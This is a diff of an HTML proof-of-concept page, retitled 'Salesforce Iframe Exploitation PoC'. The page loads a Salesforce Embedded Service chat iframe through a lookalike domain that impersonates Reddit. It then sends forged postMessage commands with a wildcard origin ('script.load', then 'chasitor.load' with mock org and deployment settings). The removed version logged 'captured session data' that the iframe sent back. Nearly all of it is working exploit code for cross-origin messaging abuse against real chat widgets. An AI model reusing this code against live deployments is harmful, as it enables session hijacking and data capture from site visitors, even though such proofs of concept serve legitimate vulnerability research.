@@ -1,48 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce iframe Metadata Console Test</title>
+  <title>Salesforce Iframe Exploitation PoC</title>
 </head>
 <body>
-  <h2>Console Test: Salesforce iframe Metadata</h2>
+  <h2>Salesforce PoC - chasitor.load simulation</h2>
 
-  <iframe id="eswFrame"
-          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
-          allow="camera *; microphone *;"
-          style="width:100%;height:400px;"></iframe>
+  <iframe
+    id="eswFrame"
+    src="https://reddit.com.wangdubruh.xyz"  <!-- Your proxied ESW 4.0 iframe -->
+    onload="runPoC()"
+    style="width:600px;height:400px;border:1px solid black"
+    allow="camera *; microphone *;"
+  ></iframe>
 
   <script>
-    const frame = document.getElementById("eswFrame");
-
-    window.addEventListener("message", (e) => {
-      console.log("📩 Message from iframe:", e.data);
-
-      if (typeof e.data === "object" && e.data.method &&
-          (e.data.method === "liveagent.initialized" || e.data.method === "liveagent.restored")) {
-        console.log("✅ Captured session data from chasitor:");
-        console.log(JSON.stringify(e.data.data, null, 2));
-      }
-    });
-
-    frame.onload = () => {
+    function runPoC() {
       console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-      ["chasitor", "filetransfer"].forEach((feature) => {
-        const msg = { method: "script.load", feature };
-        console.log("📤 Sending script.load for feature:", feature);
-        frame.contentWindow.postMessage(msg, "*");
+      const iframe = document.getElementById("eswFrame").contentWindow;
+
+      // Send script.load for features
+      ["chasitor", "filetransfer"].forEach(feature => {
+        console.log(`📤 Sending script.load for feature: ${feature}`);
+        iframe.postMessage({ method: "script.load", feature }, "*");
       });
 
+      // Simulated chasitor.load payload with mock settings
       setTimeout(() => {
-        const msg = {
-          method: "chasitor.sendMessage",
-          domain: "reddit.com.wangdubruh.xyz",
-          data: "hello from PoC"
+        const mockSettings = {
+          settingsObj: {
+            chasitorSrc: "https://service.force.com/embeddedservice/5.0/esw.min.js",
+            endpointURL: "https://d.la2-c1cs-ia4.salesforceliveagent.com/chat",
+            contentServerURL: "https://c.la2-c1cs-ia4.salesforceliveagent.com/content",
+            orgId: "00Dxx0000001gEREAY",  // fake org
+            deploymentId: "572xx000000L6gRAAS", // fake deployment
+            buttonId: "573xx000000L6gRAAS", // fake button
+            visitorInfo: { visitCount: 1, originalReferrer: "https://reddit.com", pages: [] }
+          },
+          hasOnlyExtraPrechatInfo: false,
+          prechatFormDetails: [],
+          prechatEntities: []
         };
-        console.log("📤 Sending fake message to chasitor");
-        frame.contentWindow.postMessage(msg, "*");
-      }, 3000);
-    };
+
+        console.log("📤 Sending chasitor.load with mock settings");
+        iframe.postMessage({
+          method: "chasitor.load",
+          domain: "reddit.com.wangdubruh.xyz",
+          data: mockSettings
+        }, "*");
+      }, 1000);
+    }
   </script>
 </body>
 </html>
